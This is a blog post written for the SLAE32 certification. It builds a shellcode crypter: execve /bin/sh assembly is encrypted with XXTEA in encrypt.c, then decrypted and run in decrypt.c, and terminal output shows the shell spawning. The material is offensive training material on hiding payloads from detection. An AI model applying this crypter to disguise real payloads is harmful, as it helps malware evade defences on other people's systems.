@@ -1,0 +1,254 @@
+I"�E<h3 id="the-blog-post-has-been-created-for-completing-the-requirements-of-the-securitytube-linux-assembly-expert-certification">The blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:</h3>
+<p><a href="http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/">http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/</a><br />
+Student ID: SLAE-990</p>
+
+<p>Assignment #7</p>
+
+<hr />
+
+<h2 id="description">Description</h2>
+<ul>
+  <li>Create a custom crypter like the one shown in the “crypters” video</li>
+  <li>Free to use any existing encryption schema</li>
+  <li>Can use any programming language</li>
+</ul>
+
+<h2 id="choosing-a-symmetric-encryption-algorithm">Choosing a symmetric encryption algorithm</h2>
+<p>For the encryption and decryption of the shellcode I have chosen to use the Corrected Block TEA (XXTEA) block cipher.  Further reading on this implementation can be found here =&gt; <a href="https://en.wikipedia.org/wiki/XXTEA">XXTEA</a>.</p>
+
+<p><img src="http://localhost:4000/images/slae32/07-01.png" /><br />
+One round of XXTEA <a href="https://en.wikipedia.org/wiki/XXTEA">(Source)</a><br /></p>
+
+<p>As to not reimplement XXTEA itself I discovered a C implementation of the cipher on github at <a href="https://github.com/xxtea/xxtea-c">XXTEA encryption arithmetic library</a>. This implementation will allow me to encrypt the shellcode and emmit it in shellcode form.</p>
+
+<h2 id="shellcode-to-encrypt">Shellcode to encrypt</h2>
+<p>I will be using some shellcode from earlier to spawn a simple /bin/sh.  The assembly to spawn this shell is:</p>
+<div class="language-nasm highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+</pre></td> --><td class="rouge-code"><pre><span class="nf">global</span> <span class="nv">_start</span>			
+
+<span class="nf">section</span> <span class="nv">.text</span>
+<span class="nl">_start:</span>
+
+	<span class="c1">; PUSH the first null dword</span>
+	<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
+	<span class="nf">push</span> <span class="nb">eax</span>
+
+	<span class="c1">; PUSH //bin/sh (8 bytes)</span>
+	<span class="nf">push</span> <span class="mh">0x68732f2f</span>
+	<span class="nf">push</span> <span class="mh">0x6e69622f</span>
+	<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
+	<span class="nf">push</span> <span class="nb">eax</span>
+	<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
+	<span class="nf">push</span> <span class="nb">ebx</span>
+	<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
+	<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>
+	<span class="nf">int</span> <span class="mh">0x80</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<p>The generated shellcode from objdump that we will encrypt is:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+</pre></td> --><td class="rouge-code"><pre>[sengen@manjaro-x86 assignment7]$ objdump -d ./execve-stack|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="encrypting-shellcode">Encrypting shellcode</h3>
+<p>For the encryption we will take the shellcode we generated above and hardcode it into our encrypt.c source code.  Utilizing the XXTEA algorithm we’ll encrypt each byte and output it in shellcode format.</p>
+
+<h4 id="encryptc">encrypt.c</h4>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+</pre></td> --><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include "xxtea.h"
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"usage: ./encrypt &lt;key&gt;"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">shellcode</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class="s">"</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">shellcode_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">shellcode</span><span class="p">);</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"Shellcode before encryption:"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">counter</span> <span class="o">&lt;</span> <span class="n">shellcode_len</span><span class="p">;</span> <span class="o">++</span><span class="n">counter</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">shellcode</span><span class="p">[</span><span class="n">counter</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">encrypt_data</span> <span class="o">=</span> <span class="n">xxtea_encrypt</span><span class="p">(</span><span class="n">shellcode</span><span class="p">,</span> <span class="n">strlen</span><span class="p">(</span><span class="n">shellcode</span><span class="p">),</span> <span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Encrypted shellcode:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">counter</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">encrypt_data</span><span class="p">);</span> <span class="n">counter</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">encrypt_data</span><span class="p">[</span><span class="n">counter</span><span class="p">],</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">encrypt_data</span><span class="p">[</span><span class="n">counter</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+<h4 id="compiling-and-running-the-encryptc-program">Compiling and running the encrypt.c program</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+</pre></td> --><td class="rouge-code"><pre>[sengen@manjaro-x86 assignment7]$ gcc -Wall encrypt.c xxtea.c xxtea.h -o encrypt
+[sengen@manjaro-x86 assignment7]$ ./encrypt slae32-assembly-expert
+Shellcode before encryption:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80
+
+Encrypted shellcode:
+\x5b\x69\x1c\xed\x22\x51\x2c\xcc\x53\x92\x18\xa4\xed\x12\x31\xb2\x86\xe0\x05\xfe\x96\xd5\x71\xd5\x7e\x5b\xd6\x10\x2f\xe9\xf5\x9e
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="decrypting-shellcode">Decrypting shellcode</h3>
+<p>Now we have an encrypted version of the shellcode.  We’ll copy this out and place it into our decrypt.c program.  This does the opposite and performs the decryptions of each byte and again we’ll print it to the screen.  Additionally, we’ll now execute the shellcode which will spawn our /bin/sh.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24
+25
+26
+27
+28
+29
+30
+31
+32
+33
+34
+</pre></td> --><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;string.h&gt;
+#include "xxtea.h"
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"usage: ./decrypt &lt;key&gt;"</span><span class="p">);</span>
+        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">encrypted_data</span><span class="p">[]</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x5b\x69\x1c\xed\x22\x51\x2c\xcc\x53\x92\x18\xa4\xed\x12\x31\xb2\x86\xe0\x05\xfe\x96\xd5\x71\xd5\x7e\x5b\xd6\x10\x2f\xe9\xf5\x9e</span><span class="s">"</span><span class="p">;</span>
+    <span class="kt">size_t</span> <span class="n">encrypted_data_len</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">((</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">encrypted_data</span><span class="p">);</span>
+    <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">key</span> <span class="o">=</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="s">"Shellcode before decryption:"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">int</span> <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">counter</span> <span class="o">&lt;</span> <span class="n">encrypted_data_len</span><span class="p">;</span> <span class="o">++</span><span class="n">counter</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">encrypted_data</span><span class="p">[</span><span class="n">counter</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="kt">size_t</span> <span class="n">len</span><span class="p">;</span>
+    <span class="kt">unsigned</span> <span class="kt">char</span> <span class="o">*</span><span class="n">decrypted_data</span> <span class="o">=</span> <span class="n">xxtea_decrypt</span><span class="p">(</span><span class="n">encrypted_data</span><span class="p">,</span> <span class="n">encrypted_data_len</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">len</span><span class="p">);</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Decrypted shellcode:</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span>
+    <span class="k">for</span> <span class="p">(</span><span class="kt">size_t</span> <span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">counter</span> <span class="o">&lt;</span> <span class="n">strlen</span><span class="p">(</span><span class="n">decrypted_data</span><span class="p">);</span> <span class="n">counter</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">decrypted_data</span><span class="p">[</span><span class="n">counter</span><span class="p">],</span> <span class="p">(</span><span class="kt">int</span><span class="p">)</span><span class="n">decrypted_data</span><span class="p">[</span><span class="n">counter</span><span class="o">+</span><span class="mi">1</span><span class="p">]);</span>
+    <span class="p">}</span>
+
+    <span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n\n</span><span class="s">Executing shellcode."</span><span class="p">);</span>
+
+    <span class="kt">int</span> <span class="p">(</span><span class="o">*</span><span class="n">ret</span><span class="p">)()</span> <span class="o">=</span> <span class="p">(</span><span class="kt">int</span><span class="p">(</span><span class="o">*</span><span class="p">)())</span><span class="n">decrypted_data</span><span class="p">;</span>
+    <span class="n">ret</span><span class="p">();</span>
+
+    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h4 id="compiling-and-running-the-decryptc-program">Compiling and running the decrypt.c program</h4>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code><table class="rouge-table"><tbody><tr><!-- <td class="rouge-gutter gl"><pre class="lineno">1
+2
+3
+4
+5
+6
+7
+8
+9
+</pre></td> --><td class="rouge-code"><pre>[sengen@manjaro-x86 assignment7]$ gcc -Wall decrypt.c xxtea.c xxtea.h -o decrypt
+[sengen@manjaro-x86 assignment7]$ ./decrypt slae32-assembly-expert
+Shellcode before decryption:
+\x5b\x69\x1c\xed\x22\x51\x2c\xcc\x53\x92\x18\xa4\xed\x12\x31\xb2\x86\xe0\x05\xfe\x96\xd5\x71\xd5\x7e\x5b\xd6\x10\x2f\xe9\xf5\x9e
+
+Decrypted shellcode:
+\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x00
+
+sh-4.4$
+</pre></td></tr></tbody></table></code></pre></div></div>
+
+<h3 id="source-code">Source code</h3>
+<p>All source code for this assignment can be found at<br />
+ <a href="https://github.com/tdmathison/SLAE32/tree/master/assignment7">https://github.com/tdmathison/SLAE32/tree/master/assignment7</a>.</p>
+:ET
